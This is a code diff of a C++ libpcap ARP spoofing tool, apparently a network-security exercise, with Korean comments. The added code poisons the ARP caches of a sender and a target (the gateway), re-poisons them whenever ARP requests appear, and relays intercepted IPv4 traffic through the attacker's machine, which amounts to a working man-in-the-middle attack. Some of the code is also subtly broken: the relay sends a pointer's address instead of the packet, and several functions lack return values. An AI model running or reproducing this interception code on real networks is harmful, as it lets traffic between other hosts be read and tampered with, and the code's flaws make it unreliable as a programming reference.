@@ -1,5 +1,4 @@
 #include "arp_spoof.h"
-#include <unistd.h>
 
 EthArpPacket gen_arp_req(Mac smac_, Ip sip_, Ip tip_)
 {
@@ -15,7 +14,7 @@ EthArpPacket gen_arp_req(Mac smac_, Ip sip_, Ip tip_)
     packet.arp_.op_ = htons(ArpHdr::Request);
     packet.arp_.smac_ = Mac(smac_);
     packet.arp_.sip_ = htonl(sip_);
-    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
+    packet.arp_.tmac_ = Mac(Mac::nullMac());
     packet.arp_.tip_ = htonl(tip_);
 
     return packet;
@@ -41,6 +40,7 @@ EthArpPacket gen_arp_reply(Mac smac_, Mac tmac_, Ip sip_, Ip tip_)
     return packet;
 }
 
+// 패킷을 입력받아 원하는 arp reply인지 확인
 Mac get_arp_reply_mac(const u_char *packet, Mac dmac_, Ip sip_, Ip tip_)
 {
     EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));
@@ -61,6 +61,7 @@ Mac get_arp_reply_mac(const u_char *packet, Mac dmac_, Ip sip_, Ip tip_)
         return Mac::broadcastMac();
 }
 
+// arp request를 보내고 get_arp_reply_mac()에서 원하는 reply인지 확인
 Mac get_mac_via_arp(pcap_t *pcap, Mac myMac, Ip myIp, Ip tip_)
 {
     EthArpPacket packet = gen_arp_req(myMac, myIp, tip_);
@@ -97,24 +98,15 @@ Mac get_mac_via_arp(pcap_t *pcap, Mac myMac, Ip myIp, Ip tip_)
     return smac;
 }
 
-void *t_get_mac_via_arp(void *argv)
-{
-    ArpTArgs *arpTArgs = (ArpTArgs *)argv;
-    ArpReqs arpReqs = arpTArgs->arpReqs_;
-    Mac smac = get_mac_via_arp(arpTArgs->pcap_, arpReqs.smac_, arpReqs.sip_, arpReqs.tip_);
-    arpTArgs->retMac_ = smac;
-
-    pthread_exit(NULL);
-}
-
 int send_arp_reply(pcap_t *pcap, EthArpPacket packet)
 {
-    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
-    if (res != 0)
+    for (int i = 0; i < 3; i++)
     {
-        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+        int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), sizeof(EthArpPacket));
+        if (res != 0)
+            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
     }
-
+    printf("sending arp reply... \n");
     return 1;
 }
 
@@ -141,6 +133,50 @@ void *t_send_arp_replys(void *argv)
     pthread_exit(NULL);
 }
 
+int arp_reply_to_req(pcap_t *pcap, const u_char *packet, ArpSpoofReqs arpSpoofReqs, EthArpPacket ethArpPacket_s, EthArpPacket ethArpPacket_t)
+{
+    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
+    EthArpPacket *ethArpPacket = (EthArpPacket *)malloc(sizeof(EthArpPacket));
+
+    send_arp_reply(pcap, ethArpPacket_t);
+
+    ethArpPacket = (EthArpPacket *)packet;
+
+    if (ethArpPacket->arp_.sip() == arpReqs.sip_ && ethArpPacket->arp_.tip() == arpReqs.tip_ && ethArpPacket->arp_.op() == ArpHdr::Request)
+        send_arp_reply(pcap, ethArpPacket_s);
+
+    if (ethArpPacket->arp_.sip() == arpReqs.tip_ && ethArpPacket->arp_.tip() == arpReqs.sip_ && ethArpPacket->arp_.op() == ArpHdr::Request)
+        send_arp_reply(pcap, ethArpPacket_t);
+}
+
+int relay_ip_packet(pcap_t *pcap, const u_char *packet, ArpSpoofReqs arpSpoofReqs, bpf_u_int32 len)
+{
+    ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
+
+    EthHdr *ethHdr;
+    ethHdr = (EthHdr *)packet;
+
+    if (ethHdr->dmac_ != arpSpoofReqs.myMac_)
+        return -1;
+
+    printf("test1 %s %s\n", std::string(ethHdr->dmac()).c_str(), std::string(arpReqs.smac_).c_str());
+    // sender에서 target으로 보내는 패킷. 감염되어 공격자에게 오는 중 ~
+
+    if (ethHdr->smac_ == arpReqs.smac_)
+        ethHdr->dmac_ = arpReqs.tmac_;
+    else if (ethHdr->smac_ == arpReqs.tmac_)
+        ethHdr->dmac_ = arpReqs.smac_;
+
+    ethHdr->smac_ = arpSpoofReqs.myMac_;
+
+    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char *>(&packet), len);
+    if (res != 0)
+        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
+
+    printf("ip packet detected\n");
+    printf("ip packet detected\n");
+}
+
 int arp_spoof(ArpSpoofReqs arpSpoofReqs)
 {
     char errbuf[PCAP_ERRBUF_SIZE];
@@ -151,28 +187,61 @@ int arp_spoof(ArpSpoofReqs arpSpoofReqs)
         return -1;
     }
 
-    int status;
+    // 상대 Mac 알아오기
     ArpReqs arpReqs = arpSpoofReqs.arpReqs_;
     arpReqs.smac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.sip_);
     arpReqs.tmac_ = get_mac_via_arp(pcap, arpSpoofReqs.myMac_, arpSpoofReqs.myIp_, arpReqs.tip_);
+    printf("sender mac: %s\n", std::string(arpReqs.smac_).c_str());
+    printf("target mac: %s\n", std::string(arpReqs.tmac_).c_str());
+    arpSpoofReqs.arpReqs_ = arpReqs;
 
-    printf("sender mac:  %s\n", std::string(arpReqs.smac_).c_str());
-    printf("target mac:  %s\n", std::string(arpReqs.tmac_).c_str());
+    // arp reply 보내기
+    EthArpPacket ethArpPacket_t = gen_arp_reply(arpSpoofReqs.myMac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_); // target에게 내가 sender라고 속임
+    EthArpPacket ethArpPacket_s = gen_arp_reply(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_); // sender에게 내가 target(gateway)라고 속임
+    send_arp_reply(pcap, ethArpPacket_t);
+    send_arp_reply(pcap, ethArpPacket_s);
 
-    ArpTArgs *arpTArgs = (ArpTArgs *)malloc(sizeof(ArpTArgs));
-    arpTArgs->pcap_ = pcap;
-    arpTArgs->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_);
+    ArpTArgs *arpTArgs_s = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+    arpTArgs_s->pcap_ = pcap;
+    arpTArgs_s->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.smac_, arpReqs.tip_, arpReqs.sip_);
+    ArpTArgs *arpTArgs_t = (ArpTArgs *)malloc(sizeof(ArpTArgs));
+    arpTArgs_t->pcap_ = pcap;
+    arpTArgs_t->arpReqs_ = ArpReqs(arpSpoofReqs.myMac_, arpReqs.tmac_, arpReqs.sip_, arpReqs.tip_);
 
-    int thr_id;
-    pthread_t pthread;
-    thr_id = pthread_create(&pthread, NULL, t_send_arp_replys, (void *)arpTArgs);
-    if (thr_id < 0)
+    int thr_id[2];
+    pthread_t pthread[2];
+    thr_id[0] = pthread_create(&pthread[0], NULL, t_send_arp_replys, (void *)arpTArgs_s);
+    sleep(1);
+    thr_id[1] = pthread_create(&pthread[1], NULL, t_send_arp_replys, (void *)arpTArgs_t);
+
+    // 감염
+    // 이제 arp request 패킷을 탐지하면서 적절하게 재감염 시킬 것.
+    EthHdr *ethHdr = (EthHdr *)malloc(sizeof(EthHdr));
+    while (true)
     {
-        perror("pthread0 create error");
-        exit(EXIT_FAILURE);
+        struct pcap_pkthdr *header;
+        const u_char *packet;
+
+        int res = pcap_next_ex(pcap, &header, &packet);
+        if (res == 0)
+            continue;
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
+            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
+            break;
+        }
+
+        ethHdr = (EthHdr *)packet;
+
+        if (ethHdr->type() == EthHdr::Arp)
+            arp_reply_to_req(pcap, packet, arpSpoofReqs, ethArpPacket_s, ethArpPacket_t);
+        else if (ethHdr->type() == EthHdr::Ip4)
+            relay_ip_packet(pcap, packet, arpSpoofReqs, header->caplen);
     }
 
-    pthread_join(pthread, (void **)&status);
+    int status;
+    for (int i = 0; i < 2; i++)
+        pthread_join(pthread[i], (void **)&status);
 
     pcap_close(pcap);
 }
